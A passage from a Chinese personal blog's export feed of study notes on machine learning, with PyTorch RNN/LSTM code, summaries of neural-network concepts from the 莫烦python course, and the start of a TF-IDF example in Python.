rnn(test_x[:<span class="number">10</span>].view(<span class="number">-1</span>, <span class="number">28</span>, <span class="number">28</span>))</span><br><span class="line">pred_y = torch.max(test_output, <span class="number">1</span>)[<span class="number">1</span>].data.numpy().squeeze()</span><br><span class="line">print(pred_y, <span class="string">'prediction number'</span>)</span><br><span class="line">print(test_y[:<span class="number">10</span>], <span class="string">'real number'</span>)</span><br></pre></td></tr></table></figure>


<blockquote>
<p>RNN(<br>      (rnn): LSTM(28, 64, batch_first=True)<br>      (out): Linear(in_features=64, out_features=10, bias=True)<br>)</p>
</blockquote>
<blockquote>
<p>Epoch: 0 | train loss 2.2883 | test accuracy: 0.10<br>Epoch: 0 | train loss 0.8795 | test accuracy: 0.57<br>Epoch: 0 | train loss 1.0830 | test accuracy: 0.76</p>
</blockquote>
<h2 id="回归"><a href="#回归" class="headerlink" title="回归"></a>回归</h2><p>用sin预测cos</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">from</span> torch <span class="keyword">import</span> nn</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"><span class="comment"># torch.manual_seed(1)    # reproducible</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Hyper Parameters</span></span><br><span class="line">TIME_STEP = <span class="number">10</span>  <span class="comment"># rnn time step</span></span><br><span class="line">INPUT_SIZE = <span class="number">1</span>  <span class="comment"># rnn input size</span></span><br><span class="line">LR = <span class="number">0.02</span>  <span class="comment"># learning rate</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># show data</span></span><br><span class="line">steps = np.linspace(<span class="number">0</span>, np.pi * <span class="number">2</span>, <span class="number">100</span>, dtype=np.float32)  <span class="comment"># float32 for converting torch FloatTensor</span></span><br><span class="line">x_np = np.sin(steps)</span><br><span class="line">y_np = np.cos(steps)</span><br><span class="line">plt.plot(steps, y_np, <span class="string">'r-'</span>, label=<span class="string">'target (cos)'</span>)</span><br><span class="line">plt.plot(steps, x_np, <span class="string">'b-'</span>, label=<span class="string">'input (sin)'</span>)</span><br><span class="line">plt.legend(loc=<span class="string">'best'</span>)</span><br><span class="line">plt.show()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RNN</span><span class="params">(nn.Module)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        super(RNN, self).__init__()</span><br><span class="line"></span><br><span class="line">        self.rnn = nn.RNN(</span><br><span class="line">            input_size=INPUT_SIZE,<span class="comment"># 1 用sin的数据预测cos</span></span><br><span class="line">            hidden_size=<span class="number">32</span>,  <span class="comment"># rnn hidden unit（time step）</span></span><br><span class="line">            num_layers=<span class="number">1</span>,  <span class="comment"># number of rnn layer</span></span><br><span class="line">            batch_first=<span class="literal">True</span>,  <span class="comment"># input &amp; output will has batch size as 1s dimension. e.g. (batch, time_step, input_size)</span></span><br><span class="line">        )</span><br><span class="line">        self.out = nn.Linear(<span class="number">32</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span><span class="params">(self, x, h_state)</span>:</span></span><br><span class="line">        <span class="comment"># x (batch, time_step, input_size)</span></span><br><span class="line">        <span class="comment"># h_state (n_layers, batch, hidden_size)</span></span><br><span class="line">        <span class="comment"># r_out (batch, time_step, hidden_size)</span></span><br><span class="line">        r_out, h_state = self.rnn(x, h_state) <span class="comment"># 将状态当作下一步的输入</span></span><br><span class="line">        <span class="comment"># r_outb包含所有的out但是h——state只包含最后一个</span></span><br><span class="line"></span><br><span class="line">        outs = []  <span class="comment"># save all predictions</span></span><br><span class="line">        <span class="keyword">for</span> time_step <span class="keyword">in</span> range(r_out.size(<span class="number">1</span>)):  <span class="comment"># calculate output for each time step</span></span><br><span class="line">            outs.append(self.out(r_out[:, time_step, :]))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 将list变成tensor</span></span><br><span class="line">        <span class="keyword">return</span> torch.stack(outs, dim=<span class="number">1</span>), h_state</span><br><span class="line"></span><br><span class="line">        <span class="comment"># instead, for simplicity, you can replace above codes by follows</span></span><br><span class="line">        <span class="comment"># r_out = r_out.view(-1, 32)</span></span><br><span class="line">        <span class="comment"># outs = self.out(r_out)</span></span><br><span class="line">        <span class="comment"># outs = outs.view(-1, TIME_STEP, 1)</span></span><br><span class="line">        <span class="comment"># return outs, h_state</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># or even simpler, since nn.Linear can accept inputs of any dimension</span></span><br><span class="line">        <span class="comment"># and returns outputs with same dimension except for the last</span></span><br><span class="line">        <span class="comment"># outs = self.out(r_out)</span></span><br><span class="line">        <span class="comment"># return outs</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rnn = RNN()</span><br><span class="line">print(rnn)</span><br><span class="line"></span><br><span class="line">optimizer = torch.optim.Adam(rnn.parameters(), lr=LR)  <span class="comment"># optimize all cnn parameters</span></span><br><span class="line">loss_func = nn.MSELoss()</span><br><span class="line"></span><br><span class="line">h_state = <span class="literal">None</span>  <span class="comment"># for initial hidden state</span></span><br><span class="line"></span><br><span class="line">plt.figure(<span class="number">1</span>, figsize=(<span class="number">12</span>, <span class="number">5</span>))</span><br><span class="line">plt.ion()  <span class="comment"># continuously plot</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> step <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">    start, end = step * np.pi, (step + <span class="number">1</span>) * np.pi  <span class="comment"># time range</span></span><br><span class="line">    <span class="comment"># use sin predicts cos</span></span><br><span class="line">    steps = np.linspace(start, end, TIME_STEP, dtype=np.float32,</span><br><span class="line">                        endpoint=<span class="literal">False</span>)  <span class="comment"># float32 for converting torch FloatTensor</span></span><br><span class="line">    x_np = np.sin(steps)</span><br><span class="line">    y_np = np.cos(steps)</span><br><span class="line"></span><br><span class="line">    x = torch.from_numpy(x_np[np.newaxis, :, np.newaxis])  <span class="comment"># shape (batch, time_step, input_size)</span></span><br><span class="line">    y = torch.from_numpy(y_np[np.newaxis, :, np.newaxis])</span><br><span class="line"></span><br><span class="line">    prediction, h_state = rnn(x, h_state)  <span class="comment"># rnn output</span></span><br><span class="line">    <span class="comment"># !! next step is important !!</span></span><br><span class="line">    h_state = h_state.data  <span class="comment"># repack the hidden state, break the connection from last iteration</span></span><br><span class="line"></span><br><span class="line">    loss = loss_func(prediction, y)  <span class="comment"># calculate loss</span></span><br><span class="line">    optimizer.zero_grad()  <span class="comment"># clear gradients for this training step</span></span><br><span class="line">    loss.backward()  <span class="comment"># backpropagation, compute gradients</span></span><br><span class="line">    optimizer.step()  <span class="comment"># apply gradients</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># plotting</span></span><br><span class="line">    plt.plot(steps, y_np.flatten(), <span class="string">'r-'</span>)</span><br><span class="line">    plt.plot(steps, prediction.data.numpy().flatten(), <span class="string">'b-'</span>)</span><br><span class="line">    plt.draw()</span><br><span class="line">    plt.pause(<span class="number">0.05</span>)</span><br><span class="line"></span><br><span class="line">plt.ioff()</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>




<h1 id="LSTM"><a href="#LSTM" class="headerlink" title="LSTM"></a>LSTM</h1><p>解决RNN的梯度消失和梯度爆炸</p>
<p>增加输入控制、输出控制和忘记控制</p>
<p><strong>感觉RNN部分没听太明白，还需要补充其它资料再学一下</strong></p>
]]></content>
      <categories>
        <category>pytorch</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>机器学习</tag>
        <tag>pytorch</tag>
      </tags>
  </entry>
  <entry>
    <title>机器学习/机器学习基础</title>
    <url>/2021/02/21/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><blockquote>
<p>课程：莫烦python</p>
</blockquote>
<h1 id="机器学习方法"><a href="#机器学习方法" class="headerlink" title="机器学习方法"></a>机器学习方法</h1><p>监督学习：有数据有标签<br>无监督学习：只有数据没有标签<br>半监督学习（类似聚类）</p>
<p>强化学习<br>遗传算法</p>
<h1 id="神经网络"><a href="#神经网络" class="headerlink" title="神经网络"></a>神经网络</h1><h2 id="科普"><a href="#科普" class="headerlink" title="科普"></a>科普</h2><p>人的神经网络：修正神经元之间的连接直至达到运动目的<br>计算机的神经网络</p>
<h2 id="计算机神经网络"><a href="#计算机神经网络" class="headerlink" title="计算机神经网络"></a>计算机神经网络</h2><p>模型</p>
<p>自适应</p>
<p>利用统计建立输入和输出的关系</p>
<p>输出层：认知结果</p>
<img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2021/02/21/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80/image-20210219110212221.png"  alt="image-20210219110212221" style="zoom:50%;">

<p>错误判断-&gt;反向传递修改结点敏感度</p>
<p>刺激函数</p>
<h2 id="卷积神经网络（CNN）"><a href="#卷积神经网络（CNN）" class="headerlink" title="卷积神经网络（CNN）"></a>卷积神经网络（CNN）</h2><p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2021/02/21/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80/image-20210219110533249.png"  alt="image-20210219110533249"></p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2021/02/21/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80/image-20210219110549071.png"  alt="image-20210219110549071"></p>
<p>一个像素点-&gt;一小块像素点<br>图片信息的连续性</p>
<p>池化</p>
<h2 id="循环神经网络（RNN）"><a href="#循环神经网络（RNN）" class="headerlink" title="循环神经网络（RNN）"></a>循环神经网络（RNN）</h2><p>数据的顺序</p>
<p>记住发生的事情</p>
<p>每分析完一组数据会产生相应的状态参加下一组数据的处理</p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2021/02/21/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80/image-20210219111250132.png"  alt="image-20210219111250132"></p>
<h2 id="LSTM-RNN-循环神经网络"><a href="#LSTM-RNN-循环神经网络" class="headerlink" title="LSTM RNN 循环神经网络"></a>LSTM RNN 循环神经网络</h2><p>long short term memory</p>
<p><strong>普通RNN：</strong></p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2021/02/21/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80/image-20210219111619425.png"  alt="image-20210219111619425"></p>
<p>梯度消失和梯度爆炸 $w^n$</p>
<p>无法回忆起救援记忆</p>
<p><strong>LSMT</strong></p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2021/02/21/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80/image-20210219111745087.png"  alt="image-20210219111745087"></p>
<p>主线的更新取决于输入和忘记控制</p>
<p>输出：基于主线和分线</p>
<h2 id="自编码-Autoencoder"><a href="#自编码-Autoencoder" class="headerlink" title="自编码 Autoencoder"></a>自编码 Autoencoder</h2><p>一种神经网络形式</p>
<img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2021/02/21/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80/image-20210219112228638.png"  alt="image-20210219112228638" style="zoom:50%;">

<p>提取具有代表性的信息，减小同时处理的神经元数量</p>
<h2 id="生成对抗网络-GAN"><a href="#生成对抗网络-GAN" class="headerlink" title="生成对抗网络 GAN"></a>生成对抗网络 GAN</h2><p>利用没有意义的随机数生成输出</p>
<p>机器（discriminator）对输出进行判断和学习，并向随机数处理过程（gennerator）进行反馈</p>
<h2 id="神经网络的黑盒"><a href="#神经网络的黑盒" class="headerlink" title="神经网络的黑盒"></a>神经网络的黑盒</h2><p>黑盒：人不能直接理解的中间结果</p>
<p>将一种代表特征转化成另一种</p>
<img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2021/02/21/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80/image-20210219113150711.png"  alt="image-20210219113150711" style="zoom:33%;">

<img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2021/02/21/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80/image-20210219113230537.png"  alt="image-20210219113230537" style="zoom:33%;">

<h2 id="梯度下降-gradient-descent-in-neural-nets"><a href="#梯度下降-gradient-descent-in-neural-nets" class="headerlink" title="梯度下降 gradient descent in neural nets"></a>梯度下降 gradient descent in neural nets</h2><p>optimization</p>
<p>cost function</p>
<img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2021/02/21/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80/image-20210219113812512.png"  alt="image-20210219113812512" style="zoom:33%;">

<p>很多时候都只能找到局部最优</p>
<h2 id="迁移学习-Transfer-learning"><a href="#迁移学习-Transfer-learning" class="headerlink" title="迁移学习 Transfer learning"></a>迁移学习 Transfer learning</h2><p>借鉴其它已经训练好的模型</p>
<p>适用于大型的模型</p>
<h1 id="神经网络技巧"><a href="#神经网络技巧" class="headerlink" title="神经网络技巧"></a>神经网络技巧</h1><h2 id="检验神经网络"><a href="#检验神经网络" class="headerlink" title="检验神经网络"></a>检验神经网络</h2><p>学习效率不高或效果不好</p>
<p>训练数据0.7&amp;测试数据0.3</p>
<p>误差</p>
<img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2021/02/21/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80/image-20210219114552798.png"  alt="image-20210219114552798" style="zoom: 40%;">

<p>精确度</p>
<img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2021/02/21/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80/image-20210219114601709.png"  alt="image-20210219114601709" style="zoom: 40%;">

<p>过拟合</p>
<img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2021/02/21/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80/image-20210219114634350.png"  alt="image-20210219114634350" style="zoom:33%;">

<p>交叉验证</p>
<p>找到满足误差要求且节约资源的层</p>
<img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2021/02/21/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80/image-20210219114716454.png"  alt="image-20210219114716454" style="zoom:33%;">

<h2 id="特征标准化"><a href="#特征标准化" class="headerlink" title="特征标准化"></a>特征标准化</h2><p>使数据跨度尽量统一，加快学习速率、提升学习效果</p>
<img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2021/02/21/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80/image-20210219115031301.png"  alt="image-20210219115031301" style="zoom:50%;">

<h2 id="区分好用的特征"><a href="#区分好用的特征" class="headerlink" title="区分好用的特征"></a>区分好用的特征</h2><p>更容易得到结果</p>
<p>eg.可以区分种类的特征</p>
<p>避免重复性信息、无意义信息、复杂信息</p>
<h2 id="激励函数"><a href="#激励函数" class="headerlink" title="激励函数"></a>激励函数</h2><p>线性方程“掰弯”</p>
<img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2021/02/21/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80/image-20210219120411752.png"  alt="image-20210219120411752" style="zoom:50%;">

<p>可能会导致梯度爆炸和梯度消失</p>
<img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2021/02/21/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80/image-20210219120457588.png"  alt="image-20210219120457588" style="zoom:50%;">

<h2 id="过拟合"><a href="#过拟合" class="headerlink" title="过拟合"></a>过拟合</h2><p>在小范围数据内表现良好，但是大范围数据不好</p>
<p>解决方法：增加数据量、正规化</p>
<p>L1L2：</p>
<img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2021/02/21/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80/image-20210219132456372.png"  alt="image-20210219132456372" style="zoom:50%;">

<p>dropout：随机丢弃神经元</p>
<h2 id="加速神经网络训练"><a href="#加速神经网络训练" class="headerlink" title="加速神经网络训练"></a>加速神经网络训练</h2><p>SGD：将数据分成多批</p>
<p>momentum<img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2021/02/21/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80/image-20210219132826963.png"  alt="image-20210219132826963"></p>
<p>adagrad<img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2021/02/21/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80/image-20210219132718520.png"  alt="image-20210219132718520"></p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2021/02/21/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80/image-20210219132749071.png"  alt="image-20210219132749071"></p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2021/02/21/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80/image-20210219132756721.png"  alt="image-20210219132756721"></p>
<h2 id="处理不均衡数据"><a href="#处理不均衡数据" class="headerlink" title="处理不均衡数据"></a>处理不均衡数据</h2><ol>
<li>获取更多的数据</li>
<li>使用其它评判方式</li>
<li>重组数据，调配比例</li>
<li>使用其它机器学习算法</li>
<li>修改算法<img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2021/02/21/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80/image-20210219174811515.png"  alt="image-20210219174811515" style="zoom:50%;"></li>
</ol>
<h2 id="批标准化"><a href="#批标准化" class="headerlink" title="批标准化"></a>批标准化</h2><p>（还是没太懂，回来再看看）</p>
<p>例tan，对绝对值较大的数据差距不敏感</p>
<p>数据分成批，对每一层进行标准化</p>
<img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2021/02/21/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80/image-20210219175401859.png"  alt="image-20210219175401859" style="zoom:50%;">

<img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2021/02/21/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80/image-20210219175435834.png"  alt="image-20210219175435834" style="zoom:50%;">



<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2021/02/21/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80/image-20210219175642072.png"  alt="image-20210219175642072"></p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2021/02/21/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80/image-20210219175912962.png"  alt="image-20210219175912962"></p>
<h2 id="L1-L2正规化"><a href="#L1-L2正规化" class="headerlink" title="L1/L2正规化"></a>L1/L2正规化</h2><p>防止过拟合</p>
<img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2021/02/21/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80/image-20210221105451773.png"  alt="image-20210221105451773" style="zoom:50%;">

<img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2021/02/21/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80/image-20210221105352158.png"  alt="image-20210221105352158" style="zoom:50%;">



<h1 id="自然语言处理"><a href="#自然语言处理" class="headerlink" title="自然语言处理"></a>自然语言处理</h1><h2 id="什么是自然语言处理"><a href="#什么是自然语言处理" class="headerlink" title="什么是自然语言处理"></a>什么是自然语言处理</h2><p>将句子转化成数字，进行后续处理</p>
<h2 id="搜索引擎是怎么工作的"><a href="#搜索引擎是怎么工作的" class="headerlink" title="搜索引擎是怎么工作的"></a>搜索引擎是怎么工作的</h2><p>文字：提取关键词赋予权重构成索引</p>
<img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2021/02/21/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80/image-20210221190028680.png"  alt="image-20210221190028680" style="zoom:50%;">

<p>倒排索引-&gt;批量召回：先构建文章和索引的对应关系，搜索时返回索引对应的文章</p>
<p>匹配排序：TF-IDF（粗排）相似度评分</p>
<p>TF：词频<br>IDF：词的区分度<br>两者相乘</p>
<img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2021/02/21/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80/image-20210221190522268.png"  alt="image-20210221190522268" style="zoom:50%;">

<p>搜索向量和文章向量进行比对，返回距离最近的向量</p>
<h2 id="机器理解语言的方式-词向量技术"><a href="#机器理解语言的方式-词向量技术" class="headerlink" title="机器理解语言的方式 词向量技术"></a>机器理解语言的方式 词向量技术</h2><p>相近的内容-》向量距离小</p>
<p>相似度-》向量夹角的cos</p>
<p>越有区分力的词越远离中间地区</p>
<h2 id="语言模型的注意力"><a href="#语言模型的注意力" class="headerlink" title="语言模型的注意力"></a>语言模型的注意力</h2><p>注意到一个或多个词汇</p>
<img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2021/02/21/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80/image-20210221191905361.png"  alt="image-20210221191905361" style="zoom:33%;">

<p>句向量通过全局信息生成对话</p>
]]></content>
  </entry>
  <entry>
    <title>python/nlp/莫烦python</title>
    <url>/2021/01/30/python/nlp/%E8%8E%AB%E7%83%A6python/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>网站：七月在线</p>
<p><a href="https://mofanpy.com/tutorials/machine-learning/nlp/" target="_blank" rel="noopener">https://mofanpy.com/tutorials/machine-learning/nlp/</a></p>
<p>深度学习相对于大数据需要更长的时间</p>
<h1 id="TF-IDF"><a href="#TF-IDF" class="headerlink" title="TF-IDF"></a>TF-IDF</h1><p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2021/01/30/python/nlp/%E8%8E%AB%E7%83%A6python/image-20210130215626400.png"  alt="image-20210130215626400"></p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2021/01/30/python/nlp/%E8%8E%AB%E7%83%A6python/image-20210130215656432.png"  alt="image-20210130215656432"></p>
<p>语言向量化</p>
<ul>
<li>TF：词频</li>
<li>IDF：突出关键词，和其它文档中不同的部分</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> visual <span class="keyword">import</span> show_tfidf   <span class="comment"># this refers to visual.py in my [repo](https://github.com/MorvanZhou/NLP-Tutorials/)</span></span><br><span class="line"></span><br><span class="line">docs = [</span><br><span class="line">    <span class="string">"it is a good day, I like to stay here"</span>,</span><br><span class="line">    <span class="string">"I am happy to be here"</span>,</span><br><span class="line">    <span class="string">"I am bob"</span>,</span><br><span class="line">    <span class="string">"it is sunny today"</span>,</span><br><span class="line">    <span class="string">"I have a party today"</span>,</span><br><span class="line">    <span class="string">"it is a dog and that is a cat"</span>,</span><br><span class="line">    <span class="string">"there are dog and cat on the tree"</span>,</span><br><span class="line">    <span class="string">"I study hard this morning"</span>,</span><br><span class="line">    <span class="string">"today is a good day"</span>,</span><br><span class="line">    <span class="string">"tomorrow will be a good day"</span>,</span><br><span class="line">    <span class="string">"I like coffee, I like book and I like apple"</span>,</span><br><span class="line">    <span class="string">"I do not like it"</span>,</span><br><span class="line">    <span class="string">"I am kitty, I like bob"</span>,</span><br><span class="line">    <span class="string">"I do not care who like bob, but I like kitty"</span>,</span><br><span class="line">    <span class="string">"It is coffee time, bring your cup"</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将文档的单词转换成ID形式</span></span><br><span class="line">docs_words = [d.replace(<span class="string">","</span>, <span class="string">""</span>).split(<span class="string">" "</span>) <span class="keyword">for</span> d <span class="keyword">in</span> docs]</span><br><span class="line">vocab = set(itertools.chain(*docs_words))</span><br><span class="line">v2i = &#123;v: i <span class="keyword">for</span> i, v <span class="keyword">in</span> enumerate(vocab)&#125;</span><br><span class="line">i2v = &#123;i: v <span class="keyword">for</span> v, i <span class="keyword">in</span> v2i.items()&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">safe_log</span><span class="params">(x)</span>:</span></span><br><span class="line">    mask = x != <span class="number">0</span></span><br><span class="line">    x[mask] = np.log(x[mask])</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">tf_methods = &#123;</span><br><span class="line">        <span class="string">"log"</span>: <span class="keyword">lambda</span> x: np.log(<span class="number">1</span>+x),</span><br><span class="line">        <span class="string">"augmented"</span>: <span class="keyword">lambda</span> x: <span class="number">0.5</span> + <span class="number">0.5</span> * x / np.max(x, axis=<span class="number">1</span>, keepdims=<span class="literal">True</span>),</span><br><span class="line">        <span class="string">"boolean"</span>: <span class="keyword">lambda</span> x: np.minimum(x, <span class="number">1</span>),</span><br><span class="line">        <span class="string">"log_avg"</span>: <span class="keyword">lambda</span> x: (<span class="number">1</span> + safe_log(x)) / (<span class="number">1</span> + safe_log(np.mean(x, axis=<span class="number">1</span>, keepdims=<span class="literal">True</span>))),</span><br><span class="line">    &#125;</span><br><span class="line">idf_methods = &#123;</span><br><span class="line">        <span class="string">"log"</span>: <span class="keyword">lambda</span> x: <span class="number">1</span> + np.log(len(docs) / (x+<span class="number">1</span>)),</span><br><span 